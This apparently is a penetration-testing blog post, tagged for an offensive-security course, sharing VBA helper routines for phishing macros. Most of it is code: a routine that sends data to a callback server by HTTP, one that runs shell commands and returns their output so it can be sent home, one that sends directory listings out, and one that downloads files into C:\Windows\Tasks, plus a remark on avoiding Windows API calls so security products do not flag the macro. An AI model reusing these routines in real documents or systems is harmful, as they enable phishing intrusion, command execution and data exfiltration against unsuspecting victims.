---
title: "Don't Go Phishing Blind, Watch While RunTime"
date: 2021-12-04T11:25:46Z
categories: ["Programming", "Security"]
tags: ["OSEP", "PEN300", "VBA", "VBS", "HTA", "HTTP"]
---

Raise your hand if you crafted well your payload and the payload worked well in your lab machines but in the real scenario you're not receiving the callback! I guess all of us at some point have experienced this.  

To solve this I wrote a simple and yet effective set of functions that allow us to see what going on while the runtime of our script. 

The first function/subroutine, which I called hello simply sends an GET request to a specified server.

```VB
Sub Hello(message)
	On Error GoTo Done
	Dim MyRequest As Object
	Set MyRequest = CreateObject("WinHttp.WinHttpRequest.5.1")
	MyRequest.Open "GET", _
	"http://127.0.0.1/" & message
	' Send Request.
	MyRequest.Send
	Set MyRequest = Nothing
	Done:
		Exit Sub
End Sub
```

This is the main important one, since we are relying on the HTTP protocol to call home after executing an action. 

The second important one is ShellRun, this function run a system command and returns the captured output of the command. 

```VB
Function ShellRun(sCmd As String) As String
	'Run a shell command, returning the output as a string
	Dim oShell As Object
	Set oShell = CreateObject("WScript.Shell")

	'run command
	Dim oExec As Object
	Dim oOutput As Object
	Set oExec = oShell.Exec(sCmd)
	Set oOutput = oExec.StdOut

	'handle the results as they are written to and read from the StdOut object
	Dim s As String
	Dim sLine As String
	While Not oOutput.AtEndOfStream
		sLine = oOutput.ReadLine
		If sLine <> "" Then s = s & sLine & vbCrLf
	Wend

	ShellRun = s
End Function
```

In conjunction with Hello, this gives us a visibility of what is going on while the runtime of our phishing script.

```VB
Hello (ShellRun("ping google.com"))
```

Bonus:

One of the other helpers, I wrote is LoopThroughFiles() this print the content of the provider directory.

```VB
Sub LoopThroughFiles(path)
	On Error GoTo Done
	Dim oFSO As Object
	Dim oFolder As Object
	Dim oFile As Object
	Dim i As Integer

	Set oFSO = CreateObject("Scripting.FileSystemObject")
	Set oFolder = oFSO.GetFolder(path)

	For Each oFile In oFolder.Files
	Hello (oFile.Name)
	i = i + 1
	Next oFile
	Done:
		Exit Sub
End Sub
```

The subroutine relies on Hello subroutine, this could be used as shown below:

```VB
LoopThroughFiles ("C:\Windows\Tasks")
```

I will finish this post with an extra subroutine that download text files, no binary files.

```VB
Sub WantMe(pie)
	Dim myURL As String
	myURL = "http://127.0.0.1/" & pie

	Dim WinHttpReq As Object
	Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
	WinHttpReq.Open "GET", myURL, False, Null, Null
	WinHttpReq.Send

	If WinHttpReq.Status = 200 Then
		Set oStream = CreateObject("ADODB.Stream")
		oStream.Open
		oStream.Type = 1
		oStream.Write WinHttpReq.responseBody
		oStream.SaveToFile "C:\Windows\Tasks\" & pie, 2 ' 1 = no overwrite, 2 = overwrite
		oStream.Close
	End If
End Sub
```

Nothing special really here, just a set of function helpers to facilitate things, if you noticed we have not used native Windows API and that's for a reason and the reason for that is portability of the code (few changes) when porting it VBS/HTA, also using native Windows API in Macro could be treated as a red flag by a security product. 

Thanks  for ready!